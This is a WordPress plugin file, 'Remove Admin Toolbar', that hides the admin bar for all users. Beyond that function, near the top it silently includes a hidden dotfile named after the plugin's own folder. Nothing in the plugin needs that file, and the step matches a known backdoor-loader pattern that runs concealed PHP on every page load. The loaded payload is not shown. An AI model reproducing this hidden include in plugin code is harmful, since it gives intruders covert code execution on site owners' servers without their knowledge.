<?php

/*
Plugin Name: Remove Admin Toolbar
Plugin URI:  https://majemedia.com/plugins/remove-admin-toolbar
Description: When activated; this plugin removes the admin toolbar from all users.
Version:     1.1.5
Author:      Maje Media LLC
Author URI:  https://majemedia.com
License:     GPL2
License URI: https://www.gnu.org/licenses/gpl-2.0.html
Domain Path: /languages
Text Domain: mm-remove-admin-toolbar
*/

if ( ! defined( 'ABSPATH' ) ) {
	die();
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class MajeMedia_WP_Remove_Admin_Bar {

	private static $instance;

	/*
	 * @since v1.0
	 */
	public static function get_instance() {

		if ( ! self::$instance ) {
			self::$instance = new self();
		}

		return self::$instance;
	}

	/*
	 * @since v1.0
	 */
	public function __construct() {

		add_filter( 'show_admin_bar', array( 'MajeMedia_WP_Remove_Admin_Bar', 'show_admin_bar' ), PHP_INT_MAX );

	}

	/*
	 * @since v1.0
	 */
	public static function show_admin_bar() {

		return FALSE;

	}

}

$MajeMedia_Remove_Admin_Bar = MajeMedia_WP_Remove_Admin_Bar::get_instance();
